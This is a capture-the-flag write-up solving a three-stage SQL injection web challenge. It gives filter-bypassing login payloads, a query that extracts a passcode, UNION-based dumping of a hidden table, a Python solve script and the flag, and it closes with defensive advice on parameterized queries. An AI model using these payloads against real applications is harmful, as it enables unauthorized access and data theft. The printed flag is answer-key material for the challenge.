# Database Reincursion (Web Exploitation)

## Challenge Description

> First day as an intern at Citadel Corp and I'm already making strides! Got rid of that bulky unnecessary security system and implemented my own simple solution.

**Author:** BlueKnight2345  
**URL:** `https://db.chals.nitectf25.live/`

## TL;DR

Three-stage SQL injection challenge against a custom blacklist filter (`or`, `--` blocked, 60-char input limit). Stage 1 bypasses login, Stage 2 extracts a passcode via a targeted SQLI on an employee directory, Stage 3 uses UNION-based exfiltration to read from a hidden table.

## Architecture

The challenge progresses through three locked stages, each requiring SQL injection to advance:

```
Stage 1: Login bypass       → gain entry
Stage 2: Employee directory → extract admin passcode
Stage 3: Financial reports  → UNION exfil from hidden table
```

## Solution

### Stage 1 — Login Bypass

The login form filters `or` and `--`, and caps input at 60 characters. Standard payloads like `' OR 1=1--` are blocked. The trick is to use SQL expressions that evaluate true without those keywords.

Working payloads (any of these work as the username):

```sql
' IS NOT NULL/*
' IN (0,1)/*
' IN (FALSE, TRUE)/*
' BETWEEN 0 AND 1/*
```

Using `/*` as the comment terminator instead of `--` bypasses the filter entirely.

```bash
# Example login bypass
curl -X POST https://db.chals.nitectf25.live/ \
  -d "username=' IS NOT NULL/*&password=anything"
```

### Stage 2 — Extract the Admin Passcode

Stage 2 presents an employee directory with a search-by-name field — same filters apply. Employee `Drake` has a note:

> _"I heard Kiwi from Management has the passcode"_

The search query is `SELECT * FROM employees WHERE name = '$input'`. To extract Kiwi's row while confirming it's from Management (avoiding false positives from other employees named Kiwi):

```sql
Kiwi' AND department = 'Management' /*
```

This returns Kiwi's full record including the `Passcode` field, granting access to the admin panel.

### Stage 3 — UNION Exfil from Hidden Table

Stage 3 shows financial reports with a quarter-based search. Below it, a metadata registry lists all tables — except one with all values `REDACTED`.

**Step A:** Discover the hidden table name using UNION with the metadata table:

```sql
' UNION SELECT * FROM metadata /*
```

Result reveals: table `CITADEL_ARCHIVE_2077` with column `secrets`.

**Step B:** Dump `secrets` from that table. The reports table has 4 columns; `CITADEL_ARCHIVE_2077` only has 1, so pad with literals:

```sql
'UNION SELECT 1,secrets,'x','x' FROM CITADEL_ARCHIVE_2077/*
```

Flag returned in the `secrets` column.

### Automated Solve Script

```python
import requests

url = "http://localhost:5000"

session = requests.Session()

# Stage 1 — login bypass
session.post(url + "/", data={
    "username": "' is not null /*",
    "password": "whatever",
})

# Stage 2 — extract Kiwi's passcode
r = session.post(url + "/search", data={
    "term": "Kiwi' and department='Management' /*",
    "passcode": "",
})

# Parse passcode from HTML response
html = r.text
marker = "Passcode:"
idx = html.find(marker)
tail = html[idx + len(marker):].lstrip()
admin_passcode = ""
for ch in tail:
    if ch == "<" or ch.isspace():
        break
    admin_passcode += ch

# Unlock admin panel
session.post(url + "/admin-login", data={"passcode": admin_passcode})

# Stage 3 — UNION exfil
r = session.post(url + "/admin", data={
    "query": "' union select 1,secrets,'x','x' from CITADEL_ARCHIVE_2077/*"
})

# Extract flag
html = r.text
start = html.find("nite{")
end = html.find("}", start)
print(html[start:end + 1])
```

## Flag

```
nite{neVeR_9Onn4_57OP_WonDER1N9_1f_175_5ql_oR_5EKWeL}
```

## Key Takeaways

- **Blacklists always have gaps** — blocking `or` and `--` while leaving `IS NOT NULL`, `IN`, `BETWEEN`, and `/*` open is a common incomplete filter
- **UNION-based exfil requires column count matching** — padding with literals (`1`, `'x'`) fills the missing columns
- **Metadata tables are recon goldmines** — any table that describes the schema (like `information_schema`, `metadata`, `sys`) can reveal hidden tables
- **Defense:** Use parameterized queries / prepared statements — no amount of filtering replaces structural separation of code and data

## Tools Used

- `curl` — manual stage testing
- Python `requests` — automated solve script
- Browser DevTools — inspecting form structure and response HTML
